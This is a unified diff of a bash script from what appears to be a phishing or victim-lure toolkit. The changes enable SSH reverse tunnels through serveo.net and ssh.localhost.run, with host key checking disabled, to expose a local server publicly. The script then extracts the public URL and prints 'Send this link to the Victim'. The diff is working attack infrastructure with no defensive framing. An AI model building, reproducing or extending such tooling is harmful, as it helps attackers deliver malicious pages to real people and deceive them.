@@ -464,7 +464,7 @@ How to display Log
 function relays(){
 	echo -e """$grey
 Choose the HTTP(S) Relay$grey
-  1 x serveo.net
+  1 - serveo.net
   2 - ssh.localhost.run
   3 - openport
   4 x Localtunnel$yellow choose subdomain$grey
@@ -479,9 +479,9 @@ Choose the HTTP(S) Relay$grey
 
 	1 | 01 )
 	    echo -e "[+] Starting SSH Tunneling..."
-	    #ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port serveo.net 2> /dev/null > sendlink.txt &
-	    #sleep 10
-	    #send_link=$(cat sendlink.txt | grep -o "https://[0-9a-z]*\.serveo.net")
+	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port serveo.net > sendlink.txt &
+	    sleep 10
+	    send_link=$(cat sendlink.txt | grep -o "https://[0-9a-z]*\.serveo.net")
 	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;
 
 	2 | 02 )
@@ -491,7 +491,10 @@ Choose the HTTP(S) Relay$grey
 	    #send_link=$(cat sendlink.txt | cut -d ' ' -f 5)
 	    #send_link=$(cat sendlink.txt | grep -o "https://root-[0-9a-z]*\.localhost.run")
 	    #echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey"
-	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port ssh.localhost.run;;
+	    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:127.0.0.1:$port ssh.localhost.run > sendlink.txt &
+	    sleep 10
+	    send_link=$(cat sendlink.txt | grep -o "https://[0-9a-z]*\-[0-9a-z]*\.localhost.run")
+	    echo -e "[+] Send this link to the Victim:$yellowb $send_link$grey";;
 
 	3 | 03 )
 		cd $MAIN_PATH/relays/
